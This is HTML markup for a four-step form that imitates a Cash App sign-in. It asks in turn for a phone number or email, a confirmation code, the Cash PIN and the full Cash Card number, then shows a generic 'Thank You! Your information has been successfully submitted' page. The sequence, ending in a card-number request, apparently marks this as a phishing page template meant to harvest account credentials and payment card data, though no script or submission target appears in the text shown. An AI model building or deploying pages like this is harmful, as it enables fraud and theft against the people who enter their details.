<div class="form-container">
    <!-- Step 1 -->
    <div id="step1">
        <h4 class="font-size">Log In</h4>
        <p class="titel text-muted">Enter your phone number or email. New to Cash App? <a href="#">Create account</a>
        </p>

        <div id="phoneInputSection">
            <label for="mobileNumber" class="titel form-label">Mobile number</label>
            <div class="input-group mb-3">
                <span class="input-group-text">🇺🇸 +1</span>
                <input type="text" id="mobileNumber" class="form-control" placeholder="(123) 456 7890">
            </div>
        </div>

        <div id="emailInputSection" style="display: none;">
            <label for="email" class="form-label">Email</label>
            <input type="email" id="email" class="form-control mb-3" placeholder="example@email.com">
        </div>

        <div class="d-flex justify-content-between">
            <button class="btn btn-outline-secondary" id="toggleInputButton">Use Email</button>
            <button class="btn btn-success" id="continueToStep2">Continue</button>
        </div>
    </div>

    <!-- Step 2 -->
    <div id="step2" style="display: none;">
        <h4 class="text-center">Enter the code sent to your email</h4>
        <p class="text-center text-muted">We sent the code to <span id="registeredInfo">1234567890</span></p>
        <p class="text-center"><a href="#" class="text-success">Get help</a></p>

        <label for="confirmationCode" class="titel form-label">Confirmation code</label>
        <input type="text" id="confirmationCode" class="font form-control mb-3" placeholder="Code">

        <button class="btn btn-success w-100" id="continueToStep3">Continue</button>
    </div>

    <!-- Step 3 -->
    <div id="step3" style="display: none;">
        <h4 class="text-center">Welcome Back</h4>
        <p class="text-center text-muted">Enter your Cash PIN to continue</p>

        <div class="d-flex font justify-content-center gap-3 mb-4">
            <div class="pin-dot" id="dot1"></div>
            <div class="pin-dot" id="dot2"></div>
            <div class="pin-dot" id="dot3"></div>
            <div class="pin-dot" id="dot4"></div>
        </div>

        <input type="password" id="pinInput" maxlength="4" class="font form-control text-center mb-3"
            style="letter-spacing: 10px;" placeholder="••••">

        <button class="btn btn-success w-100" id="continueToStep4">Continue</button>
    </div>

    <!-- Step 4 -->
    <div id="step4" style="display: none;">
        <h4 class="font-size">Submit Your Card</h4>
        <p class="titel text-muted">Enter the Cash Card Number to proceed</p>

        <label for="cashCardNumber" class="form-label">Cash Card Number</label>
        <input type="text" id="cashCardNumber" class="form-control mb-3" placeholder="XXXX XXXX XXXX XXXX">

        <button class="btn btn-success w-100" id="submitForm">Submit</button>
    </div>

    <!-- Thank You Page -->
    <div id="thankYouPage" style="display: none;">
        <div class="thank-you">
            <h4>Thank You!</h4>
            <p>Your information has been successfully submitted.</p>
        </div>
    </div>
</div>